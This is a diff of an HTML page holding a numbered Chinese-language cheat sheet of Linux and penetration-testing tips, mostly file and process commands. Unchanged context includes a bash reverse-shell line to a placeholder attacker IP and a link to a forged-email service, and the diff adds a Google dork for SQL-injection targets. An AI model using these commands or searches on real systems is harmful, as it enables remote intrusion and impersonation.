@@ -142,10 +142,10 @@
 <span class="p">7.</span>http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
 <span class="p">8.</span>bash反弹:
     /bin/bash -i &gt; /dev/tcp/<span class="nt">&lt;attacker</span><span class="na">_ip</span><span class="nt">&gt;</span>/<span class="nt">&lt;port&gt;</span> 0<span class="err">&lt;&amp;</span>1 2&gt;&amp;1
-<span class="p">9.</span>sed - i '/Love/d' 1.txt   删除包含Love的行
+<span class="p">9.</span>sed -i '/Love/d' 1.txt   删除包含Love的行
 <span class="p">10.</span>加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&gt;&gt;
     先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
-<span class="p">11.</span>tar - T mulu.list - czf file.tar.gz
+<span class="p">11.</span>tar -T mulu.list -czf file.tar.gz
 <span class="p">12.</span>分割大文件再合并
     split -b 20m RevolutionOS.rmvb RevOS_part_,
     cat RevOS_part_<span class="err">*</span> &gt; RevolutionOS_RSB.rmvb,
@@ -1101,9 +1101,11 @@
 <span class="p">156.</span>pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
 <span class="p">157.</span>grep多行匹配:(eg.匹配exp10it.py中的api)
     pcregrep -M 'def .<span class="ge">*(.*</span>):<span class="se">\n</span>(.<span class="ge">*#.*</span><span class="se">\n</span>){1,10}'
-<span class="p">158.</span>linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法：
+<span class="p">158.</span>linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
     ps -aux | grep "vmware"
     kill pid_of_error_machine
+<span class="p">159.</span>google dock:
+    site:xxx.xxx.xxx inurl:union select
 </code></pre>
 </div>
 </span>
